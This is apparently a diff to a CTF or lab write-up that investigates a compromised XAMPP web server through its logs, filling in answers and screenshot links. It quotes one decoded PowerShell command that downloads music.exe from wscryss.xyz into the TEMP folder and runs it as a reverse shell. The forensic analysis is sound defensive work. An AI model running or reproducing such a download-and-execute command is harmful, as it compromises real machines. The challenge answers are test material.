@@ -23,7 +23,7 @@ IT staff reported unusual behavior on a workstation running a web application, t
 **Explanation:**
 Review Xampp logs. You will find malicious activity from that particular IP address.
 
-> *Screenshot placeholder*
+> <img width="1369" height="26" alt="Q1_2" src="https://github.com/user-attachments/assets/16fa1a5c-cb97-4b8b-b2ef-a69db380fc90" />
 ---
 
 ### Task 2
@@ -34,7 +34,6 @@ Review Xampp logs. You will find malicious activity from that particular IP addr
 **Explanation:**
 Look for first log request for above IP address and convert the time stamp to UTC as the original time is in Japanese timestamp
 
-> *Screenshot placeholder*
 ---
 
 ### Task 3
@@ -56,7 +55,7 @@ Look for first log request for above IP address and convert the time stamp to UT
 **Explanation:**
 If you review logs with requests for oldsite/. Path traversal vulnerability is exploited to read four filesas shown in the screenshot
 
-> *Screenshot placeholder*
+> <img width="631" height="98" alt="Q4" src="https://github.com/user-attachments/assets/0ef6c447-4e78-4f72-9008-f1cee65fb9b7" />
 ---
 
 ### Task 5
@@ -141,21 +140,22 @@ If you review logs with requests for oldsite/. Path traversal vulnerability is e
 
 **Answer:** `wscryss.xyz`
 
-**Explanation:**
+**Explanation:** you will find follwoing log which has powershell request download in base64.
 
+<img width="1462" height="16" alt="Q13_1" src="https://github.com/user-attachments/assets/2ffa07d7-3d46-4c45-b1d8-0d51ac47a6b4" />
 
-> *Screenshot placeholder*
+Once you decode yoou find following code
+
+" Invoke-WebRequest -Uri "hxxp://wscryss.xyz/music.exe" -OutFile "$env:TEMP\music.exe"; Start-Process "$env:TEMP\music.exe" "
+
 ---
 
 ### Task 13
 **Question:** The reverse shell payload was downloaded to a specific location and executed. What is the full path of this payload?
 
-**Answer:** ``
+**Answer:** `C:\Users\hoshisora\AppData\Local\Temp\music.exe`
 
-**Explanation:**
-
-
-> *Screenshot placeholder*
+**Explanation:** Based on out discovery from previous powershell decode the path is "$env:TEMP\music.exe"
 ---
 
 ### Task 14
@@ -234,4 +234,5 @@ If you review logs with requests for oldsite/. Path traversal vulnerability is e
 
 > *Screenshot placeholder*
 ---
+
 
